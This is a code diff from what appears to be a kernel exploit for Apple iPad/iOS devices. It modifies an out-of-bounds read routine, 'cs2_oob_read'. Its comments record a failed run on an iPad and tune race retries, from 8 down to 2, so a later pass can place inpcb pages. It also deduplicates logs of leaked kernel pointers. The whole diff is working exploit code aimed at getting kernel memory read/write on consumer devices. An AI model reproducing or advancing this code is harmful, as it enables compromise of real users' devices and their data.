@@ -111,8 +111,15 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
     /* volume law: 100 tries × 8 mappings × 0x2000 pages = VM machine-gun
        (configd watchdog 2026-11-04 19:36 EST, P007OpenOnly 1.24GiB / 13M faults).
        copy27: 8 tries until first HIT, then 16. OG EFAULT: adaptive 100+. */
+    /* 2026-11-21 iPad receipt (cs2_krw_log 9): 54,158 kr-fails vs 748
+       successes — the erroring windows each burned 8 pwritev attempts and
+       the budget died at pass 0 map 6 (the multi-pass engine NEVER reached
+       pass 2, the re-interleave pass that places inpcb pages). Fix: the
+       pre-hit window retries drop 8 -> 2 (two attempts show the race
+       shape; a window that errors twice is dead this pass); post-hit stays
+       16. This frees ~4x the sweep time so pass 2+ actually runs. */
     uint64_t max_tries = cs2_ctx.copy_confusion_lane
-        ? (cs2_ctx.highiest_success_idx ? 16ull : 8ull)
+        ? (cs2_ctx.highiest_success_idx ? 16ull : 2ull)
         : (cs2_ctx.highiest_success_idx + 100ull);
     for (uint64_t try_idx = 0; try_idx < max_tries; try_idx++) {
         if (try_idx && cs2_expired()) return KERN_FAILURE;   /* budget law: never exceed the 300s tap budget */
@@ -225,8 +232,27 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                                 LOG("[oob] HIT unmarked[%d]=%#llx", ui, (unsigned long long)unmarked_q[ui]);
                         }
                     }
-                    for (int ki = 0; ki < kptr_seen_n; ki++)
-                        LOG("[oob] HIT kptr[%d]=%#llx", ki, (unsigned long long)kptr_seen[ki]);
+                    /* 2026-11-21 iPad receipt: one all-identical window printed
+                       2,768 kptr rows. Dedup: print DISTINCT values; if all
+                       identical, one row with the count. */
+                    {
+                        int distinct_n = 0;
+                        uint64_t distinct[8] = {0};
+                        for (int ki = 0; ki < kptr_seen_n; ki++) {
+                            BOOL dup = NO;
+                            for (int di = 0; di < distinct_n; di++)
+                                if (distinct[di] == kptr_seen[ki]) { dup = YES; break; }
+                            if (!dup && distinct_n < 8) distinct[distinct_n++] = kptr_seen[ki];
+                        }
+                        if (distinct_n == 1 && kptr_n > kptr_seen_n) {
+                            LOG("[oob] HIT kptr ALL-IDENTICAL value=%#llx count=%llu (a repeated-pattern kernel page — dump follows)",
+                                (unsigned long long)distinct[0],
+                                (unsigned long long)kptr_n);
+                        } else {
+                            for (int di = 0; di < distinct_n; di++)
+                                LOG("[oob] HIT kptr[%d]=%#llx", di, (unsigned long long)distinct[di]);
+                        }
+                    }
                     /* v2: the bidirectional HUNT around this anchor (hole
                        geometry and real-content windows) — +/-6 pages,
                        stop at the first real-content page. */
